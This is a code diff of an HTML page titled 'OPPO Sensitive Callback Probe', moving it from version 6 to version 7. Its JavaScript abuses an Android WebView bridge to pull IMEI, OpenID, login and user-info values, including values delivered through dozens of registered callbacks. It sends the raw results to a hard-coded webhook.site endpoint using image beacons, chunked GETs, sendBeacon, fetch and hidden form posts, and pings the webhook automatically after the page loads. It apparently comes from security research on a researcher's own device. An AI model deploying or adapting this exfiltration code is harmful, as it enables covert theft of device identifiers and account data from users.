@@ -2,149 +2,68 @@
 <html>
 <head>
   <meta charset="utf-8">
-  <title>OPPO WebBridge Mobile Probe v6</title>
+  <title>OPPO Sensitive Callback Probe v7</title>
   <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=yes">
   <style>
     * { box-sizing: border-box; }
-    body {
-      font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
-      margin: 0;
-      padding: 24px 18px 90px;
-      background: #000;
-      color: #f5f5f5;
-      font-size: 22px;
-      line-height: 1.45;
-    }
-    h1 { margin: 0 0 12px; font-size: 40px; line-height: 1.12; }
-    .warn { color: #ff4d73; font-weight: 900; font-size: 24px; margin: 14px 0 22px; }
-    .target {
-      background: #121212;
-      border: 1px solid #444;
-      border-radius: 18px;
-      padding: 14px;
-      margin: 14px 0;
-      font-family: ui-monospace, SFMono-Regular, Menlo, Consolas, monospace;
-      font-size: 16px;
-      word-break: break-all;
-      color: #a6ffcb;
-    }
-    .btns { display: flex; flex-wrap: wrap; gap: 12px; margin: 18px 0; }
-    button {
-      border: 0;
-      border-radius: 16px;
-      padding: 18px 22px;
-      font-size: 22px;
-      font-weight: 900;
-      min-height: 64px;
-      background: #eee;
-      color: #111;
-    }
-    button.primary { background: #43d08d; }
-    button.danger { background: #ff4d73; color: #000; }
-    button.wide { width: 100%; }
-    .status {
-      margin: 18px 0;
-      padding: 16px;
-      border: 1px solid #333;
-      border-radius: 18px;
-      background: #111;
-      font-family: ui-monospace, SFMono-Regular, Menlo, Consolas, monospace;
-      font-size: 20px;
-      white-space: pre-wrap;
-      word-break: break-word;
-    }
-    .card {
-      margin: 14px 0;
-      padding: 16px;
-      border-radius: 18px;
-      background: #151515;
-      border: 1px solid #333;
-    }
-    .card h2 { margin: 0 0 10px; font-size: 26px; }
-    .ok { color: #5cff9f; font-weight: 900; }
-    .bad { color: #ff667f; font-weight: 900; }
-    .muted { color: #aaa; }
-    .kv {
-      font-family: ui-monospace, SFMono-Regular, Menlo, Consolas, monospace;
-      font-size: 18px;
-      white-space: pre-wrap;
-      word-break: break-word;
-    }
-    pre {
-      display: none;
-      background: #f3f3f3;
-      color: #111;
-      padding: 16px;
-      white-space: pre-wrap;
-      word-break: break-word;
-      font-size: 16px;
-      border-radius: 12px;
-    }
-    iframe { width: 1px; height: 1px; border: 0; opacity: 0; position: absolute; left: -9999px; }
+    body { margin:0; padding:22px 16px 90px; background:#050505; color:#f5f5f5; font-family:system-ui,-apple-system,BlinkMacSystemFont,"Segoe UI",sans-serif; font-size:22px; line-height:1.45; }
+    h1 { margin:0 0 12px; font-size:38px; line-height:1.12; }
+    .warn { color:#ff5470; font-weight:900; font-size:23px; }
+    .box { background:#121212; border:1px solid #444; border-radius:18px; padding:14px; margin:14px 0; word-break:break-word; }
+    button { width:100%; border:0; border-radius:16px; padding:18px; margin:8px 0; font-size:22px; font-weight:900; background:#43d08d; color:#07140d; }
+    button.secondary { background:#e9e9e9; color:#111; }
+    button.danger { background:#ff5470; color:#111; }
+    .status { font-family:ui-monospace,SFMono-Regular,Menlo,Consolas,monospace; white-space:pre-wrap; font-size:19px; }
+    .card { background:#151515; border:1px solid #333; border-radius:18px; padding:14px; margin:12px 0; }
+    .card h2 { margin:0 0 10px; font-size:25px; }
+    .ok { color:#5cff9f; font-weight:900; }
+    .bad { color:#ff667f; font-weight:900; }
+    .muted { color:#aaa; }
+    .kv { font-family:ui-monospace,SFMono-Regular,Menlo,Consolas,monospace; font-size:17px; white-space:pre-wrap; word-break:break-word; }
+    pre { display:none; background:#eee; color:#111; border-radius:12px; padding:14px; font-size:15px; white-space:pre-wrap; word-break:break-word; }
   </style>
 </head>
 <body>
-<h1>OPPO WebBridge Mobile Probe v6</h1>
-<p class="warn">v6 adds a top-level navigation ping and HTML form POST fallback. Use it to prove whether webhook.site is reachable from this WebView.</p>
+<h1>OPPO Sensitive Callback Probe v7</h1>
+<p class="warn">Goal: detect callback-delivered IMEI/OpenID/login/user data, not only direct return values.</p>
 
-<div class="target" id="target"></div>
+<div id="target" class="box status"></div>
 
-<div class="btns">
-  <button class="primary" onclick="pingWebhook('manual_ping_button')">Ping webhook</button>
-  <button class="danger" onclick="navigateWebhookPing()">NAVIGATE webhook ping</button>
-  <button class="primary wide" onclick="tryDispatcherReadonly()">Dispatcher readonly APIs</button>
-  <button onclick="runRawProbe()">RAW sensitive probe</button>
-  <button onclick="tryIndirectNativeApi()">Indirect native API</button>
-  <button onclick="tryClipboardMarker()">Clipboard marker</button>
-  <button onclick="tryStartLogin()">doStartLogin</button>
-  <button onclick="toggleJson()">Toggle full JSON</button>
-</div>
+<button onclick="runSensitiveCallbackSweep()">Run sensitive callback sweep</button>
+<button class="secondary" onclick="runDirectRawAgain()">Run direct raw again</button>
+<button class="secondary" onclick="pingWebhook()">Ping webhook</button>
+<button class="danger" onclick="navigateWebhook()">NAVIGATE webhook ping</button>
+<button class="secondary" onclick="toggleJson()">Toggle full JSON</button>
 
-<div id="status" class="status">WAITING</div>
+<div id="status" class="box status">WAITING</div>
 <div id="cards"></div>
 <pre id="out"></pre>
 
-<iframe name="webhook_sink" id="webhook_sink"></iframe>
-
 <script>
-(function () {
-  const WEBHOOK = "https://webhook.site/17fb9ad8-4513-4f6b-8b76-07b48b799e0a";
-  const VERSION = "mobile_probe_v6_form_nav";
-  window.__OPPO_WEBHOOK = WEBHOOK;
-  window.__OPPO_VERSION = VERSION;
-  window.__LAST_PAYLOAD = null;
-
-  document.getElementById("target").textContent = "WEBHOOK=" + WEBHOOK + "\nVERSION=" + VERSION;
-
-  const READONLY_ACTIONS = [
+(function(){
+  const WEBHOOK = "https://webhook.site/0b200f5d-c245-4872-bbe3-edde79de0fee";
+  const VERSION = "sensitive_callback_probe_v7";
+  const ACTIONS = [
     "account_islogin",
     "account_get_userid",
     "account_get_userinfo",
     "get_open_id",
     "get_imei",
-    "get_channel_id",
-    "get_package_name",
-    "get_device_model",
-    "get_network_type"
+    "get_channel_id"
+  ];
+  const DIRECT_METHODS = ["getImei","getOpenId","getLoginInfo","isLogin","getChannelId"];
+  const CALLBACK_KEYS = [
+    "callback","callbackName","callback_name","cb","cbName","jsCallback","js_callback",
+    "success","successCallback","complete","completeCallback","onSuccess","onComplete",
+    "function","func","handler","callbackId","callback_id"
   ];
 
-  const RAW_METHODS = [
-    "getImei",
-    "getOpenId",
-    "getLoginInfo",
-    "isLogin",
-    "getChannelId",
-    "getPackageName",
-    "getDeviceModel",
-    "getNetworkType",
-    "getRomVersion",
-    "getRomVersionCode",
-    "getStatusBarHeight",
-    "isInstalled",
-    "isSupportShake",
-    "getProgress",
-    "getButtonStatus"
-  ];
+  window.__OPPO_V7_WEBHOOK = WEBHOOK;
+  window.__OPPO_V7_CALLBACKS = [];
+  window.__OPPO_V7_LAST_PAYLOAD = null;
+
+  document.getElementById("target").textContent =
+    "WEBHOOK=" + WEBHOOK + "\nVERSION=" + VERSION + "\nbridge=" + (!!window.android) + "\nua=" + navigator.userAgent;
 
   function safeString(x) {
     try {
@@ -153,380 +72,254 @@
       if (typeof x === "string") return x;
       if (typeof x === "number" || typeof x === "boolean") return String(x);
       return JSON.stringify(x);
-    } catch (e) {
-      try { return String(x); } catch (_) { return "[unstringifiable]"; }
+    } catch(e) {
+      try { return String(x); } catch(_) { return "[unstringifiable]"; }
     }
   }
 
-  function short(s, n) {
-    s = safeString(s);
-    if (s.length <= n) return s;
-    return s.slice(0, n) + "...[+" + (s.length - n) + " chars]";
+  function short(x, n) {
+    const s = safeString(x);
+    return s.length <= n ? s : s.slice(0,n) + "...[+" + (s.length-n) + " chars]";
   }
 
-  function describeAndroidObject() {
+  function describeBridge() {
     const a = window.android;
-    if (!a || typeof a !== "object") return { exists: false, type: typeof a };
-    let ownKeys = [];
-    let functionKeys = [];
+    if (!a || typeof a !== "object") return { exists:false, type:typeof a };
+    let ownKeys = [], functionKeys = [];
     try {
-      ownKeys = Object.getOwnPropertyNames(a).slice(0, 180);
-      functionKeys = ownKeys.filter(k => {
-        try { return typeof a[k] === "function"; } catch (e) { return false; }
-      });
-    } catch (e) {}
+      ownKeys = Object.getOwnPropertyNames(a).slice(0,200);
+      functionKeys = ownKeys.filter(k => { try { return typeof a[k] === "function"; } catch(e){ return false; } });
+    } catch(e) {}
+    return { exists:true, type:typeof a, tag:Object.prototype.toString.call(a), ownKeys, functionKeys };
+  }
+
+  function base(eventType, reason) {
     return {
-      exists: true,
-      type: typeof a,
-      tag: Object.prototype.toString.call(a),
-      ownKeys,
-      functionKeys
+      eventType, version: VERSION, ts: new Date().toISOString(), reason,
+      location: { href: location.href, origin: location.origin, protocol: location.protocol, referrer: document.referrer || null },
+      environment: { userAgent: navigator.userAgent, platform: navigator.platform, language: navigator.language, cookieEnabled: navigator.cookieEnabled, webdriver: navigator.webdriver },
+      androidBridge: describeBridge()
     };
   }
 
   function callBridge(method, args) {
-    const a = window.android;
-    const item = {
-      method,
-      args: args || [],
-      exists: false,
-      ok: false,
-      returnType: null,
-      rawReturnValue: null,
-      empty: null,
-      error: null
-    };
-    try {
-      if (!a || typeof a !== "object") {
-        item.error = "window.android missing";
-        return item;
-      }
-      item.exists = typeof a[method] === "function";
-      if (!item.exists) {
-        item.error = "missing_or_not_function";
-        return item;
-      }
-      const ret = a[method].apply(a, args || []);
-      const raw = safeString(ret);
-      item.ok = true;
-      item.returnType = typeof ret;
-      item.rawReturnValue = raw;
-      item.empty = raw.length === 0 || raw === "undefined" || raw === "null";
-      return item;
-    } catch (e) {
-      item.error = String(e && (e.stack || e.message || e));
-      return item;
-    }
-  }
-
-  function callBridgeOneArg(method, arg) {
-    const item = {
-      bridgeMethod: method,
-      arg,
-      exists: false,
-      ok: false,
-      returnType: null,
-      rawReturnValue: null,
-      empty: null,
-      error: null
-    };
+    const item = { method, args: args || [], exists:false, ok:false, returnType:null, rawReturnValue:null, empty:null, error:null };
     try {
       const a = window.android;
-      if (!a || typeof a !== "object") {
-        item.error = "window.android missing";
-        return item;
-      }
+      if (!a || typeof a !== "object") { item.error = "window.android missing"; return item; }
       item.exists = typeof a[method] === "function";
-      if (!item.exists) {
-        item.error = "missing_or_not_function";
-        return item;
-      }
-      const ret = a[method](arg);
+      if (!item.exists) { item.error = "missing_or_not_function"; return item; }
+      const ret = a[method].apply(a, args || []);
       const raw = safeString(ret);
-      item.ok = true;
-      item.returnType = typeof ret;
-      item.rawReturnValue = raw;
+      item.ok = true; item.returnType = typeof ret; item.rawReturnValue = raw;
       item.empty = raw === "" || raw === "undefined" || raw === "null";
       return item;
-    } catch (e) {
+    } catch(e) {
       item.error = String(e && (e.stack || e.message || e));
       return item;
     }
   }
 
-  function basePayload(eventType, reason) {
-    return {
-      eventType,
-      version: VERSION,
-      ts: new Date().toISOString(),
-      reason,
-      safetyBoundary: {
-        rawSensitiveValuesDisplayedOnDevice: true,
-        rawSensitiveValuesSentToWebhook: true,
-        testingDevice: "researcher_owned_device"
-      },
-      location: {
-        href: location.href,
-        origin: location.origin,
-        protocol: location.protocol,
-        referrer: document.referrer || null
-      },
-      environment: {
-        userAgent: navigator.userAgent,
-        platform: navigator.platform,
-        language: navigator.language,
-        cookieEnabled: navigator.cookieEnabled,
-        webdriver: navigator.webdriver
-      },
-      androidBridge: describeAndroidObject()
-    };
+  function callOneArg(method, arg, meta) {
+    const item = { bridgeMethod: method, arg, meta: meta || null, exists:false, ok:false, returnType:null, rawReturnValue:null, empty:null, error:null };
+    try {
+      const a = window.android;
+      if (!a || typeof a !== "object") { item.error = "window.android missing"; return item; }
+      item.exists = typeof a[method] === "function";
+      if (!item.exists) { item.error = "missing_or_not_function"; return item; }
+      const ret = a[method](arg);
+      const raw = safeString(ret);
+      item.ok = true; item.returnType = typeof ret; item.rawReturnValue = raw;
+      item.empty = raw === "" || raw === "undefined" || raw === "null";
+      return item;
+    } catch(e) {
+      item.error = String(e && (e.stack || e.message || e));
+      return item;
+    }
   }
 
-  function queryFromPayload(payload, maxLen) {
+  function send(payload) {
+    window.__OPPO_V7_LAST_PAYLOAD = payload;
     const json = JSON.stringify(payload);
-    return "event=" + encodeURIComponent(payload.eventType) +
-      "&version=" + encodeURIComponent(VERSION) +
-      "&t=" + encodeURIComponent(Date.now()) +
-      "&bridge=" + encodeURIComponent(!!window.android) +
-      "&ua=" + encodeURIComponent(navigator.userAgent.slice(0, 160)) +
-      "&d=" + encodeURIComponent(json.slice(0, maxLen || 2200));
-  }
-
-  function sendFormPost(path, payload) {
-    try {
-      const form = document.createElement("form");
-      form.method = "POST";
-      form.action = WEBHOOK + path + "?event=" + encodeURIComponent(payload.eventType) + "&t=" + Date.now();
-      form.target = "webhook_sink";
-      form.enctype = "text/plain";
-
-      const input = document.createElement("textarea");
-      input.name = "payload";
-      input.value = JSON.stringify(payload);
-      form.appendChild(input);
-
-      document.body.appendChild(form);
-      form.submit();
-      setTimeout(function(){ try { form.remove(); } catch(e){} }, 2000);
-    } catch (e) {}
-  }
-
-  function sendWebhook(payload) {
-    const json = JSON.stringify(payload);
-    const eventPath = "/v6-" + String(payload.eventType || "event").toLowerCase().replace(/[^a-z0-9]+/g, "-").replace(/^-|-$/g, "");
-
-    // 1. Extremely short GET ping.
-    try {
-      new Image().src = WEBHOOK + "/v6-ping?event=" + encodeURIComponent(payload.eventType) + "&t=" + Date.now() + "&bridge=" + encodeURIComponent(!!window.android);
-    } catch (e) {}
-
-    // 2. Short summary GET.
-    try {
-      new Image().src = WEBHOOK + "/v6-summary?" + queryFromPayload(payload, 1500);
-    } catch (e) {}
-
-    // 3. Chunked GET.
+    try { new Image().src = WEBHOOK + "/v7-ping?event=" + encodeURIComponent(payload.eventType) + "&t=" + Date.now() + "&bridge=" + encodeURIComponent(!!window.android); } catch(e) {}
+    try { new Image().src = WEBHOOK + "/v7-summary?event=" + encodeURIComponent(payload.eventType) + "&t=" + Date.now() + "&d=" + encodeURIComponent(json.slice(0,2500)); } catch(e) {}
     try {
       const enc = encodeURIComponent(json);
       const size = 1500;
       const total = Math.ceil(enc.length / size);
-      for (let i = 0; i < Math.min(total, 12); i++) {
-        const part = enc.slice(i * size, (i + 1) * size);
+      for (let i=0; i<Math.min(total,18); i++) {
         const img = new Image();
-        img.src = WEBHOOK + "/v6-chunk?event=" + encodeURIComponent(payload.eventType) + "&idx=" + i + "&total=" + total + "&t=" + Date.now() + "&d=" + part;
+        img.src = WEBHOOK + "/v7-chunk?event=" + encodeURIComponent(payload.eventType) + "&idx=" + i + "&total=" + total + "&t=" + Date.now() + "&d=" + enc.slice(i*size,(i+1)*size);
       }
-    } catch (e) {}
-
-    // 4. Beacon with text/plain.
-    try {
-      navigator.sendBeacon(
-        WEBHOOK + eventPath + "-beacon",
-        new Blob([json], { type: "text/plain" })
-      );
-    } catch (e) {}
-
-    // 5. Fetch no-cors text/plain.
-    try {
-      fetch(WEBHOOK + eventPath + "-fetch", {
-        method: "POST",
-        mode: "no-cors",
-        headers: { "content-type": "text/plain" },
-        body: json
-      }).catch(function(){});
-    } catch (e) {}
-
-    // 6. Classic HTML form POST to hidden iframe.
-    sendFormPost(eventPath + "-form", payload);
+    } catch(e) {}
+    try { navigator.sendBeacon(WEBHOOK + "/v7-beacon?event=" + encodeURIComponent(payload.eventType), new Blob([json], {type:"text/plain"})); } catch(e) {}
   }
 
-  function renderCards(payload) {
+  function render(payload) {
+    document.getElementById("status").textContent =
+      payload.eventType + "\n" + payload.ts + "\nbridge=" + (!!window.android) + "\ncallbackCount=" + (window.__OPPO_V7_CALLBACKS || []).length;
+    document.getElementById("out").textContent = JSON.stringify(payload, null, 2);
     const root = document.getElementById("cards");
     root.innerHTML = "";
 
+    const callbacks = payload.callbacks || [];
+    const nonEmptyCallbacks = callbacks.filter(c => {
+      const raw = safeString(c.args);
+      return raw && raw !== "[]" && raw !== "undefined" && raw !== "null";
+    });
+
     const top = document.createElement("div");
     top.className = "card";
-    top.innerHTML =
-      "<h2>" + payload.eventType + "</h2>" +
-      "<div class='kv'>time=" + payload.ts + "\nbridge=" + (!!window.android) + "\nwebhook target=" + WEBHOOK + "\nWebhook pings/chunks/form attempted.</div>";
+    top.innerHTML = "<h2>" + payload.eventType + "</h2><div class='kv'>callbacks=" + callbacks.length + "\nnonEmptyCallbacks=" + nonEmptyCallbacks.length + "\nresults=" + ((payload.results||[]).length) + "</div>";
     root.appendChild(top);
 
-    const items = payload.results || [];
-    const hot = items.filter(x => {
-      const s = safeString(x.rawReturnValue);
-      return x.ok && !(x.empty) && s !== "" && s !== "undefined" && s !== "null";
-    });
-
-    const hotCard = document.createElement("div");
-    hotCard.className = "card";
-    if (hot.length) {
-      hotCard.innerHTML = "<h2 class='ok'>OK_NON_EMPTY count=" + hot.length + "</h2>";
-      hot.forEach(x => {
-        const div = document.createElement("div");
-        div.className = "kv";
-        div.style.marginTop = "12px";
-        div.textContent =
-          "method=" + (x.method || x.bridgeMethod) + "\n" +
-          "arg=" + short(x.arg || x.args || "", 500) + "\n" +
-          "returnType=" + x.returnType + "\n" +
-          "rawReturnValue=" + short(x.rawReturnValue, 1200);
-        hotCard.appendChild(div);
+    const cbCard = document.createElement("div");
+    cbCard.className = "card";
+    if (nonEmptyCallbacks.length) {
+      cbCard.innerHTML = "<h2 class='ok'>CALLBACK_NON_EMPTY count=" + nonEmptyCallbacks.length + "</h2>";
+      nonEmptyCallbacks.slice(0,20).forEach(c => {
+        const d = document.createElement("div");
+        d.className = "kv";
+        d.style.marginTop = "10px";
+        d.textContent = "name=" + c.name + "\nargs=" + short(c.args, 1600) + "\nmeta=" + short(c.meta, 800);
+        cbCard.appendChild(d);
       });
     } else {
-      hotCard.innerHTML = "<h2 class='bad'>NO_NON_EMPTY_SENSITIVE_RETURN_YET</h2><div class='kv'>All tested sensitive/account actions are empty, undefined, null, missing, or failed so far.</div>";
+      cbCard.innerHTML = "<h2 class='bad'>NO_CALLBACK_DATA_YET</h2><div class='kv'>No callback-delivered non-empty sensitive/account value observed.</div>";
     }
-    root.appendChild(hotCard);
+    root.appendChild(cbCard);
 
-    items.slice(0, 80).forEach(x => {
-      const card = document.createElement("div");
-      card.className = "card";
-      const okClass = x.ok ? (x.empty ? "muted" : "ok") : "bad";
-      card.innerHTML =
-        "<h2 class='" + okClass + "'>" + (x.method || x.bridgeMethod) + "</h2>" +
-        "<div class='kv'>" +
-        "ok=" + x.ok + "\n" +
-        "exists=" + x.exists + "\n" +
-        "empty=" + x.empty + "\n" +
-        "returnType=" + x.returnType + "\n" +
-        "arg=" + short(x.arg || x.args || "", 500) + "\n" +
-        "rawReturnValue=" + short(x.rawReturnValue, 1000) + "\n" +
-        "error=" + short(x.error, 800) +
-        "</div>";
-      root.appendChild(card);
-    });
+    const results = payload.results || [];
+    const nonEmptyReturns = results.filter(r => r.ok && !r.empty && safeString(r.rawReturnValue) !== "");
+    const retCard = document.createElement("div");
+    retCard.className = "card";
+    if (nonEmptyReturns.length) {
+      retCard.innerHTML = "<h2 class='ok'>RETURN_NON_EMPTY count=" + nonEmptyReturns.length + "</h2>";
+      nonEmptyReturns.slice(0,30).forEach(r => {
+        const d = document.createElement("div");
+        d.className = "kv";
+        d.style.marginTop = "10px";
+        d.textContent = "method=" + (r.method || r.bridgeMethod) + "\narg=" + short(r.arg || r.args, 900) + "\nrawReturnValue=" + short(r.rawReturnValue, 1200);
+        retCard.appendChild(d);
+      });
+    } else {
+      retCard.innerHTML = "<h2 class='bad'>NO_NON_EMPTY_RETURN</h2>";
+    }
+    root.appendChild(retCard);
+
+    send(payload);
   }
 
-  function renderAndSend(payload) {
-    window.__LAST_PAYLOAD = payload;
-    document.getElementById("status").textContent =
-      payload.eventType + "\n" +
-      payload.ts + "\n" +
-      "bridge=" + (!!window.android) + "\n" +
-      "Webhook target=" + WEBHOOK + "\n" +
-      "Webhook pings/chunks/form attempted.";
-    document.getElementById("out").textContent = JSON.stringify(payload, null, 2);
-    renderCards(payload);
-    sendWebhook(payload);
+  function registerCallback(name, meta) {
+    window[name] = function() {
+      const args = Array.prototype.slice.call(arguments).map(safeString);
+      const entry = { name, meta: meta || null, ts: new Date().toISOString(), args };
+      window.__OPPO_V7_CALLBACKS.push(entry);
+      const payload = base("OPPO_V7_CALLBACK_FIRED", "native_callback");
+      payload.callback = entry;
+      payload.callbacks = window.__OPPO_V7_CALLBACKS;
+      render(payload);
+      return "OPPO_V7_CALLBACK_RECEIVED";
+    };
   }
+
+  function prepareCallbacks() {
+    window.__OPPO_V7_CALLBACKS = [];
+    const generic = [
+      "callback","cb","success","complete","onSuccess","onComplete",
+      "oppoCallback","oppoJsCallback","nativeCallback","jsCallback",
+      "OPPO_CALLBACK","OPPO_JS_CALLBACK","OPPO_NATIVE_CALLBACK"
+    ];
+    generic.forEach(n => registerCallback(n, {kind:"generic"}));
+  }
+
+  window.runSensitiveCallbackSweep = function() {
+    prepareCallbacks();
+    const payload = base("OPPO_V7_SENSITIVE_CALLBACK_SWEEP_RESULT", "manual_sensitive_callback_sweep");
+    const results = [];
+    let idx = 0;
+
+    for (const action of ACTIONS) {
+      for (const key of CALLBACK_KEYS) {
+        const cbName = "OPPO_CB_" + idx++;
+        registerCallback(cbName, { action, key, bridge:"dispatcher" });
+
+        const variants = [
+          { type: action, [key]: cbName },
+          { type: action, data: {}, [key]: cbName },
+          { type: action, params: {}, [key]: cbName },
+          { id: "oppo_audit_" + action + "_" + key, type: action, data: {}, [key]: cbName },
+          { id: "oppo_audit_" + action + "_" + key, type: action, params: {}, [key]: cbName }
+        ];
+
+        for (const v of variants) {
+          const arg = JSON.stringify(v);
+          results.push(callOneArg("callNativeApi", arg, { action, key, cbName }));
+          results.push(callOneArg("callAsyncNativeApi", arg, { action, key, cbName }));
+        }
+      }
+    }
+
+    for (const method of DIRECT_METHODS) {
+      for (let j=0; j<8; j++) {
+        const cbName = "OPPO_DIRECT_CB_" + method + "_" + j;
+        registerCallback(cbName, { method, bridge:"direct" });
+        const argsList = [
+          [cbName],
+          [JSON.stringify({ callback: cbName })],
+          [JSON.stringify({ callbackName: cbName })],
+          [JSON.stringify({ cb: cbName })],
+          [JSON.stringify({ jsCallback: cbName })],
+          [JSON.stringify({ success: cbName })],
+          [JSON.stringify({ complete: cbName })],
+          [JSON.stringify({ id: cbName })]
+        ];
+        results.push(callBridge(method, argsList[j]));
+      }
+    }
+
+    payload.results = results;
+    payload.callbacks = window.__OPPO_V7_CALLBACKS;
+    render(payload);
+
+    setTimeout(function(){
+      const p2 = base("OPPO_V7_SENSITIVE_CALLBACK_SWEEP_AFTER_1500MS", "after_wait_1500ms");
+      p2.results = results;
+      p2.callbacks = window.__OPPO_V7_CALLBACKS;
+      render(p2);
+    }, 1500);
+
+    setTimeout(function(){
+      const p3 = base("OPPO_V7_SENSITIVE_CALLBACK_SWEEP_AFTER_5000MS", "after_wait_5000ms");
+      p3.results = results;
+      p3.callbacks = window.__OPPO_V7_CALLBACKS;
+      render(p3);
+    }, 5000);
+  };
+
+  window.runDirectRawAgain = function() {
+    const payload = base("OPPO_V7_DIRECT_RAW_RESULT", "manual_direct_raw_again");
+    payload.results = DIRECT_METHODS.concat(["getPackageName","getDeviceModel","getNetworkType","getRomVersion","getRomVersionCode"]).map(m => callBridge(m, []));
+    payload.callbacks = window.__OPPO_V7_CALLBACKS || [];
+    render(payload);
+  };
+
+  window.pingWebhook = function() {
+    const payload = base("OPPO_V7_PING", "manual_ping");
+    payload.callbacks = window.__OPPO_V7_CALLBACKS || [];
+    render(payload);
+  };
+
+  window.navigateWebhook = function() {
+    location.href = WEBHOOK + "/v7-nav-ping?event=OPPO_V7_NAV_PING&t=" + Date.now() + "&bridge=" + encodeURIComponent(!!window.android) + "&ua=" + encodeURIComponent(navigator.userAgent.slice(0,180));
+  };
 
   window.toggleJson = function() {
     const p = document.getElementById("out");
     p.style.display = p.style.display === "block" ? "none" : "block";
   };
 
-  window.pingWebhook = function(reason) {
-    const payload = basePayload("OPPO_V6_WEBHOOK_PING", reason || "manual_ping");
-    payload.note = "If this does not appear in webhook.site, the issue is endpoint/network/WebView outbound delivery, not bridge logic.";
-    renderAndSend(payload);
-  };
-
-  window.navigateWebhookPing = function() {
-    const url = WEBHOOK +
-      "/v6-nav-ping?event=OPPO_V6_NAV_PING&t=" + Date.now() +
-      "&bridge=" + encodeURIComponent(!!window.android) +
-      "&ua=" + encodeURIComponent(navigator.userAgent.slice(0, 180)) +
-      "&from=" + encodeURIComponent(location.href.slice(0, 220));
-    location.href = url;
-  };
-
-  window.runRawProbe = function() {
-    const payload = basePayload("OPPO_V6_RAW_RESULT", "manual_raw_probe");
-    payload.results = RAW_METHODS.map(m => callBridge(m, []));
-    renderAndSend(payload);
-  };
-
-  window.tryDispatcherReadonly = function () {
-    const candidates = [];
-    for (const a of READONLY_ACTIONS) {
-      candidates.push({ type: a });
-      candidates.push({ action: a });
-      candidates.push({ method: a });
-      candidates.push({ name: a });
-      candidates.push({ id: a });
-      candidates.push({ type: a, data: {} });
-      candidates.push({ id: "oppo_audit_" + a, type: a, data: {} });
-      candidates.push({ id: "oppo_audit_" + a, type: a, params: {} });
-      candidates.push({ action: a, data: {} });
-      candidates.push({ action: a, params: {} });
-      candidates.push({ method: a, data: {} });
-      candidates.push({ method: a, params: {} });
-    }
-    const results = [];
-    for (const c of candidates) {
-      const arg = JSON.stringify(c);
-      results.push(callBridgeOneArg("callNativeApi", arg));
-      results.push(callBridgeOneArg("callAsyncNativeApi", arg));
-    }
-    const payload = basePayload("OPPO_V6_DISPATCHER_READONLY_RESULT", "manual_dispatcher_readonly");
-    payload.actions = READONLY_ACTIONS;
-    payload.results = results;
-    renderAndSend(payload);
-  };
-
-  window.tryIndirectNativeApi = function() {
-    const candidates = [
-      ["callNativeApi", ["getImei"]],
-      ["callNativeApi", ["getOpenId"]],
-      ["callNativeApi", ["getLoginInfo"]],
-      ["callNativeApi", [JSON.stringify({ method: "getImei" })]],
-      ["callNativeApi", [JSON.stringify({ method: "getOpenId" })]],
-      ["callNativeApi", [JSON.stringify({ method: "getLoginInfo" })]],
-      ["callNativeApi", [JSON.stringify({ api: "getImei" })]],
-      ["callNativeApi", [JSON.stringify({ api: "getOpenId" })]],
-      ["callNativeApi", [JSON.stringify({ api: "getLoginInfo" })]],
-      ["callAsyncNativeApi", ["getImei"]],
-      ["callAsyncNativeApi", ["getOpenId"]],
-      ["callAsyncNativeApi", ["getLoginInfo"]],
-      ["callAsyncNativeApi", [JSON.stringify({ method: "getImei" })]],
-      ["callAsyncNativeApi", [JSON.stringify({ method: "getOpenId" })]],
-      ["callAsyncNativeApi", [JSON.stringify({ method: "getLoginInfo" })]]
-    ];
-    const payload = basePayload("OPPO_V6_INDIRECT_NATIVE_API_RESULT", "manual_indirect_native_api");
-    payload.results = candidates.map(c => callBridge(c[0], c[1]));
-    renderAndSend(payload);
-  };
-
-  window.tryClipboardMarker = function() {
-    const marker = "OPPO_AUDIT_CLIPBOARD_MARKER_" + Date.now();
-    const payload = basePayload("OPPO_V6_CLIPBOARD_MARKER_RESULT", "manual_clipboard_marker");
-    payload.marker = marker;
-    payload.results = [
-      callBridge("clipboardText", []),
-      callBridge("clipboardText", [marker]),
-      callBridge("clipboardText", [JSON.stringify({ text: marker })])
-    ];
-    renderAndSend(payload);
-  };
-
-  window.tryStartLogin = function() {
-    const payload = basePayload("OPPO_V6_START_LOGIN_RESULT", "manual_start_login");
-    payload.results = [callBridge("doStartLogin", [])];
-    payload.note = "State-changing UI test. Use only if you intentionally want to test login UI opening.";
-    renderAndSend(payload);
-  };
-
-  setTimeout(function () {
-    pingWebhook("auto_after_load_1200ms");
-  }, 1200);
+  setTimeout(function(){ pingWebhook(); }, 1000);
 })();
 </script>
 </body>
